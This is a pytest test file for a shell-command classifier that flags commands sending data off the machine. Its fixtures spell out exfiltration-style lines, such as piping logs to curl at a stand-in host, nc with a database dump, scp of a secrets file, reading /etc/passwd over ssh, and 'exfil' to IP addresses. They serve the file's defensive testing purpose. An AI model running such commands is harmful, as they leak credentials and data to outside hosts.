import pytest
from privacy_hud.detect.shell import extract_destinations, destination_hosts


@pytest.mark.parametrize("cmd,expected", [
    ("cat support.log", "local"),
    ("ls -la", "local"),
    ("grep foo bar.txt | wc -l", "local"),
    ("curl https://sentry.example.com -d @-", "external_net"),
    ("wget http://evil.test/x", "external_net"),
    ("scp secrets.txt user@remote:/tmp", "external_net"),
    ("ssh build-box 'cat /etc/passwd'", "external_net"),
    ("nc 10.0.0.5 4444 < dump.sql", "external_net"),
    ("git push origin main", "external_net"),
    ("cat support.log | curl -d @- https://x.test", "external_net"),
])
def test_destination_classification(cmd, expected):
    assert expected in extract_destinations(cmd)


def test_hosts_are_extracted():
    assert "sentry.example.com" in destination_hosts(
        "curl https://sentry.example.com/api -d @-")


def test_unparseable_command_fails_closed():
    # An unknown binary with a URL-looking argument must not be called local.
    assert "external_net" in extract_destinations("weirdtool --push https://x.test")


def test_unbalanced_quotes_fail_closed():
    # shlex.split raises on unbalanced quotes; a command that fails to
    # tokenize is exactly the case where we must not assume local.
    assert "external_net" in extract_destinations("echo 'unterminated")


def test_plain_filenames_are_not_mistaken_for_hosts():
    # Dotted filenames (support.log, bar.txt) must not be misread as
    # bare hostnames just because they contain a dot.
    assert "local" in extract_destinations("rm -f build.log")
    assert "local" in extract_destinations("cat notes.txt")


# --- IP-literal destinations (fix round 1) ---------------------------------
#
# Bare IP arguments to an unrecognized binary used to fall all the way
# through to "local" — no NET_BINARIES match, no BARE_HOST match (that
# regex only recognizes TLD-shaped suffixes, and an IP octet isn't one).
# That is precisely the silent-leak shape this module exists to prevent:
# `mytool 192.168.1.5 < secrets.env` shipped a file to a private-network
# host and the parser said "local". Each test below is named for the
# classification it locks in, not the input, per the fix request.

def test_bare_ipv4_target_is_external():
    assert "external_net" in extract_destinations(
        "mytool 192.168.1.5 < secrets.env")


def test_ipv4_target_with_port_is_external():
    assert "external_net" in extract_destinations(
        "exfil --to 10.0.0.9:9999 secrets.env")


def test_bare_ipv6_target_is_external():
    assert "external_net" in extract_destinations(
        "mytool 2001:db8::5 < secrets.env")


def test_bracketed_ipv6_target_with_port_is_external():
    assert "external_net" in extract_destinations(
        "exfil --to [2001:db8::5]:9999 secrets.env")


def test_loopback_ipv4_target_is_local():
    # 127.0.0.0/8 never leaves this machine.
    assert "local" in extract_destinations("mytool 127.0.0.1 < secrets.env")


def test_loopback_ipv6_target_is_local():
    # ::1 never leaves this machine.
    assert "local" in extract_destinations("mytool ::1 < secrets.env")


def test_bracketed_loopback_ipv6_with_port_is_local():
    assert "local" in extract_destinations(
        "exfil --to [::1]:9999 secrets.env")


def test_localhost_hostname_is_local():
    assert "local" in extract_destinations(
        "mytool localhost < secrets.env")


def test_cloud_metadata_ip_is_never_local():
    # 169.254.169.254 is link-local, not loopback — and it's the standard
    # cloud-instance metadata endpoint, a well-known exfil/SSRF target.
    # Link-local as a class must not be waved through as "local".
    assert "external_net" in extract_destinations(
        "mytool 169.254.169.254 < secrets.env")


def test_rfc1918_private_ip_is_external():
    # Private-range addresses still leave this machine's network stack —
    # "private" is not "local" for our purposes.
    assert "external_net" in extract_destinations(
        "mytool 172.16.5.5 < secrets.env")


def test_ip_literal_destination_is_listed_for_display():
    assert "10.0.0.9:9999" in destination_hosts(
        "exfil --to 10.0.0.9:9999 secrets.env")
